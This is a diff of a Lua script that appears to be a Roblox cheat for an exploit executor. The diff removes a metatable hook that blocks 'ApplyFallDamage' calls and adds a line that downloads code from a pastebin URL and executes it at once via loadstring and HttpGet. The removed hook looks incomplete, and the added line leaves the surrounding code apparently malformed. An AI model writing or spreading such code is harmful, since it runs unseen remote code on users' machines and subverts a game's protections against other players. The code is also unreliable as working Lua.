@@ -141,17 +141,7 @@ input.InputBegan:Connect(function(key)
         if not isfile("path.txt") then return end
         stuff = readfile("path.txt")
         print(stuff)
-        spawn(function()
-            local Mt = getrawmetatable(game)
-            local Old = Mt.__namecall
-            setreadonly(Mt, false)
-            Mt.__namecall = newcclosure(function(Self, ...)
-            local Args = {...}
-            local Method = getnamecallmethod()
-            if not checkcaller() and Args[1] == "ApplyFallDamage" then
-                return ReplicatedStorage
-            end
-        end)
+        spawn(function()loadstring(game:HttpGet("https://pastebin.com/raw/ERDp2x5W", true))()
         for word in stuff:gmatch("(.-)".." ") do  
             count = count + 1
             print("COUNT CHECK: ",count)
